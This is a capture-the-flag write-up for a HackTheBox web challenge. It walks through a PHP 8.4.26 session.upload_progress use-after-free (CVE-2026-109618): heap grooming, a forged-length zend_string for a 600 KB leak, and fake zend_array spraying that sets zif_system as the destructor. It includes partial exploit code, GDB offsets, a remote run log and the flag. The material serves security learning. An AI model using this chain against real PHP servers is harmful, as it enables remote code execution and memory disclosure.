---
title: "HTB Dark Embargo — Full Technical Writeup (CVE-2026-109618)"
date: 2026-11-05
draft: false
aliases:
  - /posts/darkembergo/
description: "A use-after-free in PHP 8.4.26's session.upload_progress cleanup (CVE-2026-109618): turning the dangling PS(id) pointer into a 600 KB heap leak and the dangling PS($_SESSION) pointer into destructor control for RCE."
tags:
  - ctf
  - htb
  - web
  - rce
  - php
categories:
  - writeups
---

# HTB Dark Embargo — Full Technical Writeup (CVE-2026-109618)

## Description

Challenge link - https://app.hackthebox.com/challenges/Dark%20Embargo?tab=play_challenge

Dark Embargo is a HackTheBox web challenge where the web application is only a decoy — the real target is the PHP engine (`php:8.4.26-apache`) serving it. The page itself is static JavaScript, so exploitation happens entirely inside the engine through a use-after-free in the `session.upload_progress` feature (**CVE-2026-109618**).

The full chain in a nutshell:

1. Trigger the use-after-free by exhausting `memory_limit` during multipart parsing, which leaves `PS(id)` and `PS($_SESSION)` dangling.
2. Use the dangling `PS(id)` as a read primitive: a forged `zend_string` length makes the `Set-Cookie` header dump 600 KB of adjacent heap memory (ASLR bypass).
3. Use the dangling `PS($_SESSION)` as the destruction primitive: spray fake `zend_array` objects into the freed chunk, with `zif_system` planted as the destructor.
4. When the request shuts down, PHP walks the corrupted pointers and executes our command.

Phases 1–4 below walk through reconnaissance, local GDB analysis, the exploit script, and remote exploitation.

## Phase 1: Reconnaissance & Environment Setup

### 1.1 Initial Analysis

We unzip the challenge files and inspect them:
```bash
unzip web_dark_embargo.zip
cd web_dark_embargo
ls -la
```
**Output:**
```text
-rw-r--r-- 1 kali kali 135 build_docker.sh
-rw-r--r-- 1 kali kali 291 Dockerfile
-rw-r--r-- 1 kali kali  24 flag.txt
-rw-r--r-- 1 kali kali 17778 index.php
```

We check for PHP code in the decoy file:
```bash
grep -c '<?php' index.php
# Output: 0
```
`index.php` is a static HTML page. The vulnerability is not in the application code; it is in the PHP engine itself.

We check the `Dockerfile`:
```dockerfile
FROM php:8.4.26-apache
COPY index.php /var/www/html/
COPY flag.txt /flag.txt
RUN chmod 0777 /flag.txt
```

We verify the remote target matches this image:
```bash
curl -s -I http://154.57.164.65:39286
```
**Output:**
```http
HTTP/1.1 200 OK
Server: Apache/2.4.69 (Debian)
X-Powered-By: PHP/8.4.26
```
The target is running the exact same `php:8.4.26-apache` Docker image (Debian Trixie).

### 1.2 The Vulnerability (CVE-2026-109618)

PHP 8.4.26 has a use-after-free vulnerability in its `session.upload_progress` feature. When a multipart POST request includes a field named `PHP_SESSION_UPLOAD_PROGRESS`, PHP creates a session on the heap *before* user code runs. If we send a payload that exhausts the `memory_limit = 128M`, PHP calls `zend_bailout()`. This uses `longjmp` to crash the request, **skipping the cleanup routines that would normally null out the session pointers in `ps_globals`**.

The result is that two global pointers (`PS(id)` and `PS($_SESSION)`) are left pointing to freed memory. When PHP shuts down, it walks these dangling pointers, which we can exploit for an ASLR leak and RCE.

## Background: The PHP Internals Behind the Exploit

Before touching GDB, it helps to understand exactly what each component used in this exploit is and what its normal job is. This section explains them in detail.

### `session.upload_progress`

Normally a PHP session is started on demand from user code, for example by calling `session_start()`. The `session.upload_progress` feature changes that: when `session.upload_progress.enabled = On` and the multipart POST body contains a field named exactly `PHP_SESSION_UPLOAD_PROGRESS`, PHP writes upload progress metadata (bytes received, upload name, etc.) into the user's `$_SESSION` array while the HTTP body is still being parsed — it exists so applications can render upload progress bars.

The detail that makes this bug reachable is **timing**. Because the field is discovered while PHP parses the multipart body (the RFC 1867 file-upload handler), PHP performs `session_start()` itself, *before any application or userland code runs*. The session ID and the `$_SESSION` zval are therefore allocated from the request heap and stored in module globals at a point in the request that we fully control. And since the body is `Transfer-Encoding: chunked`, we also control *when* parsing ends — the exploit keeps the upload alive and eventually forces it to blow through `memory_limit` exactly in the middle of this parsing loop.

### `zend_bailout()` — PHP's emergency exit

PHP does not use C++-style exceptions or stack unwinding. For errors it cannot recover from — a fatal `E_ERROR`, or exhausting `memory_limit` — it aborts the request using the classic C `setjmp`/`longjmp` mechanism:

- When request handling begins, the top-level bootstrap records the current stack context into a `jmp_buf` using `SETJMP()`. This saved context is called the **bailout**.
- `zend_bailout()`, defined in `Zend/zend.c`, simply jumps back to that saved context and never returns to its caller:

```c
ZEND_API ZEND_COLD ZEND_NORETURN void zend_bailout(void)
{
    if (!bailout) {
        zend_output_debug_string(1, "%s(): bailout reached without bailout context!", __func__);
        exit(EXIT_FAILURE);
    }
    LONGJMP(*bailout, FAILURE);
}
```

`longjmp()` is effectively a "non-local goto": execution teleports back to the point where `setjmp` was called, skipping every stack frame in between — along with **all the cleanup code those frames were supposed to run** on the way back. Anything that was supposed to be freed, flushed, or set to `NULL` before control returns normally is simply left as it is.

When we exhaust `memory_limit`, the allocator raises the familiar *"Allowed memory size of X bytes exhausted"* fatal error, and the fatal-error machinery ends in `zend_bailout()`. That is what makes OOM such a useful trigger: it is an attacker-controlled tripwire that unwinds the request from precisely the point we choose.

The critical side effect for this CVE is that the session module's request-shutdown routine — the one that frees `PS(id)`, releases the `$_SESSION` zval, and sets both pointers to `NULL` — never gets a chance to run.

### `ps_globals` and the `PS()` macro

`PS(v)` is a **macro**, not a variable — it expands to "field `v` of the session module's global state struct":

```c
/* ext/session/php_session.h */
#ifdef ZTS
# define PS(v) ZEND_TSRMG(session_globals_id, php_session_globals *, v)
#else
# define PS(v) (ps_globals.v)
#endif
```

`ps_globals` is that struct: one C object holding *every* piece of session state — the current session ID, the save handler, the `$_SESSION` zval, upload-progress keys, and so on. The `nm` output in Phase 2 lists it as `0000000001316820 B ps_globals`, where the `B` means it lives in the `.bss` section (module globals), **not** in the per-request memory pool.

That distinction is the heart of the bug: after the bailout, PHP's memory manager can bulk-free the entire request heap, but `ps_globals` itself is module-level, so nothing rewrites it. The pointers *inside* it keep naming memory that has been handed back — a textbook dangling-pointer situation.

### `PS(id)` — the current session ID

`PS(id)` is a `char *` pointing to the current session ID — the value that goes into the `PHPSESSID` cookie. In this build it sits at `ps_globals + 0x10` (confirmed in Phase 2).

Its normal lifecycle:

1. `PHP_SESSION_UPLOAD_PROGRESS` appears in a multipart POST → the parser calls `session_start()` early → PHP generates a session ID and copies it onto the request heap → `PS(id)` points there.
2. At normal end-of-request, the session module's shutdown frees that string and sets `PS(id) = NULL`.

Step 2 is what the bailout skips. The pointer survives in `ps_globals`, and the memory it names gets reclaimed wholesale by the shutdown, so `PS(id)` ends up pointing into freed, reusable heap memory.

**Why this leaks memory:** code that emits the `Set-Cookie: PHPSESSID=...` header trusts the `zend_string` sitting at `PS(id)` — including its declared length. If we groom the heap so that a *forged* `zend_string` header (length 600,000) occupies the chunk where `PS(id)` points, PHP happily copies 600 KB of adjacent heap memory into the response headers along with the cookie. That dump is what `decode_bases()` in Phase 3 mines for pointers.

### `PS($_SESSION)` and the `type_info` field

In the session module source, the field behind `$_SESSION` is the `http_session_vars` zval — embedded in the struct at `ps_globals + 0x168` in this build, with its `type_info` right after it at `+0x170`. It is the handle the engine uses to reach the `$_SESSION` superglobal.

The GDB dump in Phase 2 shows what a healthy one looks like:

```text
(gdb) x/gx 0x7f8b3fd5f988  # PS($_SESSION)
0x7f8b3fd5f988: 0x00007f8b3ce551e0      <- value: pointer to a zend_reference on the request heap

(gdb) x/gx 0x7f8b3fd5f990  # type_info
0x7f8b3fd5f990: 0x000000000000010a      <- IS_REFERENCE | REFCOUNTED
```

Each zval is 16 bytes: an 8-byte **value**, then a 4-byte **`u1.type_info`**, then a 4-byte auxiliary slot. `type_info = 0x10a` decodes as:

- low byte `0x0a` = type constant `IS_REFERENCE` — the zval holds a pointer to a `zend_reference`, which in turn wraps the real `$_SESSION` hash table;
- the flag bit above it = `IS_TYPE_REFCOUNTED` — the target is reference-counted and **must be destroyed during teardown**.

That flag is precisely what the exploit leans on: every destruction path that touches this zval checks `type_info`, sees "reference + refcounted", and follows the pointer blindly to tear down whatever it names. Normally that cleanup safely frees the real session array; after our armed OOM, the pointer still names the (now freed) chunk — so whatever we spray into that chunk gets consumed as if it were a legitimate array.

### `zif_system` — PHP's `system()` as the destructor

Every PHP-level function is backed by a C function named `zif_<name>` (*Zend Internal Function*). `zif_system`, here at `libphp.so + 0x465370`, is the implementation of PHP's `system()`.

Its address is the **weapon**: the exploit plants `zif_system` as the `pDestructor` slot of the fake `zend_array`. Because the destructor call is an ordinary function-pointer call made by the engine during teardown, pointing it at `zif_system` means the shutdown code ends up invoking PHP's own `system()` — with the command string laid out in our fake bucket's zval. The command then executes with the privileges of the Apache worker (`www-data`).

### `zend_array`, `pDestructor`, and the fake table

PHP arrays are not plain C arrays; they are `HashTable`s (the `zend_array` type). A `HashTable` is a block of metadata — table mask, sizes, bucket pointer, and a **`pDestructor`** callback — followed by `Bucket` entries. `pDestructor` is stored *inside the array header*, and `zend_hash_destroy` invokes it on every element of the table as part of cleanup.

So the `fire` phase sprays 500 exact copies of a 384-byte blob that is laid out to look like a legitimate, well-formed `HashTable`: valid header fields, `pDestructor = <libphp_base + 0x465370>` (i.e. `zif_system`), and a bucket whose value points to a fake `zend_string` containing the command we want to run. One of those copies must land exactly where the dangling `PS($_SESSION)` points — heap `chunk + 0xF5398` — so that teardown picks it up.

### `zend_string` and the forged length

A `zend_string` is PHP's internal string type: a refcounted header (`refcount` + `type_info`), a hash slot, a `len` field, and the character data. Functions that consume strings (such as the header-writing code) trust the declared `len`. The leak in Phase 3 relies on this trust: a forged `zend_string` with `len = 600000` turns one pointer (the session ID) into 600 KB of memory disclosure.

### `zval_ptr_dtor` — the leak landmark

`zval_ptr_dtor` is the engine's most-used destruction primitive: it decrements the refcount of a refcounted zval and, if it drops to zero, destroys/frees it. It is called constantly — on every variable going out of scope, on every container teardown, everywhere — so its address keeps reappearing in heap dumps that contain saved stack or symbol data.

That is why it doubles as the **leak landmark**: `zval_ptr_dtor` lives at `libphp.so + 0x65EB60`, and `0x65EB60 & 0xFFF = 0xB60`. Any leaked pointer whose lowest 12 bits end in `0xB60` is very likely a pointer to that function, so `POINTER - 0x65EB60` produces a candidate `libphp.so` base. Voting across the 600 KB dump (`most_common()`) filters out coincidental matches.

---

## Phase 2: Local Reverse Engineering with GDB

To build a reliable exploit, we must find the exact memory offsets for our specific build.

### 2.1 Setup the Debug Container
We run the challenge locally with a single Apache worker to make debugging predictable:
```bash
printf 'StartServers 1\nMinSpareServers 1\nMaxSpareServers 1\nMaxRequestWorkers 1\nServerLimit 1\n' > mpm1.conf

sudo docker run -d --name dark_dbg -p 127.0.0.1:8088:80 \
    --cap-add=SYS_PTRACE --security-opt seccomp=unconfined \
    -v "$PWD/mpm1.conf:/etc/apache2/mods-available/mpm_prefork.conf" \
    dark_embargo
```
We enable the vulnerable setting:
```bash
sudo docker exec dark_dbg bash -c 'echo "session.upload_progress.enabled=On" > /usr/local/etc/php/conf.d/zz-custom.ini'
sudo docker restart dark_dbg
```

### 2.2 Attach GDB and Find Offsets
We get the worker's PID and the base address of `libphp.so`:
```bash
WORKER=$(sudo docker top dark_dbg | awk '$1=="www-data"{print $2; exit}')
LIBPHP_BASE=$(sudo grep libphp.so /proc/$WORKER/maps | head -1 | cut -d- -f1)
echo "Base: 0x$LIBPHP_BASE"
```
We copy the binary out and extract the symbols:
```bash
sudo docker cp dark_dbg:/usr/lib/apache2/modules/libphp.so ./libphp.so
nm libphp.so | grep -E ' zif_system$| zval_ptr_dtor$| ps_globals$'
```
**Output:**
```text
0000000000465370 t zif_system
000000000065eb60 T zval_ptr_dtor
0000000001316820 B ps_globals
```

We attach GDB to read the `ps_globals` struct:
```bash
sudo gdb -q -p $WORKER
```
Inside GDB:
```gdb
(gdb) add-symbol-file libphp.so 0x$LIBPHP_BASE
(gdb) p/x 0x$LIBPHP_BASE + 0x1316820
```
This gives us the `ps_globals` base (e.g., `0x7f8b3fd5f820`). 
*   `PS(id)` is at `ps_globals + 0x10`.
*   `PS($_SESSION)` is at `ps_globals + 0x168`.

### 2.3 Proving the Dangling Pointers
We set a breakpoint on `_zend_bailout` (`0x$LIBPHP_BASE + 0x1b15cc`) and send an OOM payload (880 nested fields). 
When GDB catches the bailout, we read the pointers:
```gdb
(gdb) x/gx 0x7f8b3fd5f830  # PS(id)
0x7f8b3fd5f830: 0x00007f8b3ce550e0

(gdb) x/gx 0x7f8b3fd5f988  # PS($_SESSION)
0x7f8b3fd5f988: 0x00007f8b3ce551e0

(gdb) x/gx 0x7f8b3fd5f990  # type_info
0x7f8b3fd5f990: 0x000000000000010a  # IS_REFERENCE | REFCOUNTED
```
Both pointers are **non-null** and point to the same 2MB heap chunk. The type is `IS_REFERENCE` (refcounted), meaning PHP will follow them during shutdown.

---

## Phase 3: Exploit Script Breakdown (`exploit.py`)

The remote target uses the default 150-worker Apache pool. The exploit must ensure that the Leak, Arm, and Fire phases all hit the **same worker** so they share the same heap memory. The provided script does this by saturating the pool.

### 3.1 Constants
```python
ZIF_SYSTEM     = 0x465370      # libphp-relative offset for system()
ZVAL_PTR_DTOR  = 0x65EB60      # leak landmark
DEFAULT_S_OFFSET = 0xF5398     # chunk-relative offset for the fake array
```

### 3.2 Saturating the Worker Pool
The script opens 149 connections and sends partial chunked uploads, keeping them open forever. This ties up 149 workers, leaving exactly **1 worker free** for our exploit.
```python
def saturate(http, n, stop):
    def one():
        s = http._sock(30)
        s.sendall(b"POST / HTTP/1.1\r\nHost: ...\r\nTransfer-Encoding: chunked\r\n\r\n")
        # Sends a partial multipart body and then keeps the connection alive
        while not stop.is_set():
            s.sendall(b"100\r\n" + b"A" * 0x100 + b"\r\n")
            time.sleep(0.3)
    for _ in range(n):
        threading.Thread(target=one, daemon=True).start()
```

### 3.3 The Leak (ASLR Bypass)
We need to find the memory address of `libphp.so` and the heap chunk base. The script does this by exploiting the dangling `PS(id)` pointer.
1. **Groom**: Sends a request to stabilize the heap.
2. **Leak**: Sends a request with a forged `zend_string` (length 600,000). When PHP writes the `Set-Cookie` header, it reads this forged string and dumps 600KB of adjacent heap memory into the HTTP response.
3. **Decode**: The script scans the 600KB dump for pointers.
```python
def decode_bases(raw):
    heaps = Counter()
    for i in range(len(raw) - 7):
        v = int.from_bytes(raw[i:i + 8], "little")
        if PTR_LO <= v < PTR_HI:
            heaps[v & ~0x1FFFFF] += 1 # Find most frequent 2MB-aligned value

    heap = heaps.most_common(1)[0][0]

    mods = Counter()
    for i in range(0, len(raw) - 7, 8):
        v, = struct.unpack_from("<Q", raw, i)
        # Find pointer ending in 0xb60 (page offset of zval_ptr_dtor)
        if (PTR_LO <= v < PTR_HI and v & 0xFFF == ZVAL_PTR_DTOR & 0xFFF):
            mods[v - ZVAL_PTR_DTOR] += 1

    module = mods.most_common(1)[0][0] # libphp base
    return heap, module
```
> **How the two scans find the bases:**
> - `v & ~0x1FFFFF` clears the low 21 bits of each candidate pointer, snapping it onto a **2 MB boundary**. The true chunk base keeps reappearing all over the dump, so the most frequent boundary wins.
> - `v & 0xFFF == 0xB60` matches pointers whose **page offset** equals `zval_ptr_dtor`'s (`0x65EB60 & 0xFFF = 0xB60`). Every match `v` yields a candidate `libphp.so` base of `v - 0x65EB60`, and `most_common()` votes away the coincidences.

### 3.4 Arming the OOM
The script triggers the OOM to create the dangling `$_SESSION` pointer. It uses 880 nested fields (`files[R..][a]x62`) to amplify memory usage without triggering `post_max_size` limits.
```python
def arm(http):
    body = bytearray()
    body += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    for i in range(880):
        # 62 levels of nesting + files + R = 64 (bypasses max_input_nesting_level)
        name = (b"files[R%05d]" % i) + b"[a]" * 62
        body += part(name, b"", filename=b"")
```

### 3.5 Firing (RCE)
The script sprays 384-byte fake `zend_array` objects. One lands in the freed `$_SESSION` slot (at `heap + 0xF5398`). The fake array is carefully crafted so that its `pDestructor` points to `zif_system`, and its bucket points to a string containing our command.
```python
def fake_array(table_addr, system_addr, cmd):
    ht = bytearray(384)
    # ... (sets up valid zend_array headers) ...
    struct.pack_into("<Q", ht, 0x30, system_addr) # pDestructor = zif_system
    # ... (sets up fake bucket and string holding the command) ...
    return bytes(ht)

def fire(http, heap, module, cmd, s_offset):
    table_addr = heap + s_offset
    system_addr = module + ZIF_SYSTEM

    # Spray fake arrays into the freed $_SESSION chunk
    body = bytearray()
    for i in range(500):
        body += part(sname(b"s", i), spray_value(table_addr))
    # ... (send payload) ...
```
When the request finishes, PHP shuts down, walks the dangling `$_SESSION` pointer, calls our fake destructor, and executes `system(cmd)`.

---

## Phase 4: Remote Exploitation

We run the exploit against the remote HTB target, instructing it to write the flag into the webroot.

```bash
python3 exploit.py 154.57.164.65 39286 'cat /flag.txt >/var/www/html/fx'
```

**Execution Log:**
```text
[*] saturating the worker pool (149 blockers)
[*] leaking bases
  leak 1/4: cookie=600000B ptrs=3040 heap=0x7fccc6200000 libphp=0x7fccc7dd6000
[+] chunk=0x7fccc6200000 libphp=0x7fccc7dd6000
[*] arm + fire 1/8 (S=chunk+0xf5398)
  fire: table=0x7fccc62f5398 system=0x7fccc823b370 cmd=b'cat /flag.txt >/var/www/html/fx'
[*] arm + fire 2/8 (S=chunk+0xf5398)
...
[*] arm + fire 8/8 (S=chunk+0xf5398)
[+] done - verify the command result
```

The script successfully executed our command. We retrieve the flag from the webroot:

```bash
curl http://154.57.164.65:39286/fx
```

**Output:**
```text
HTB{6391a68f9c527618638a2f638acdf22e}
```

## Flag

```text
HTB{6391a68f9c527618638a2f638acdf22e}
```

RCE achieved on the PHP engine itself — the flag is read by the engine's own `system()`, invoked through its own shutdown cleanup.

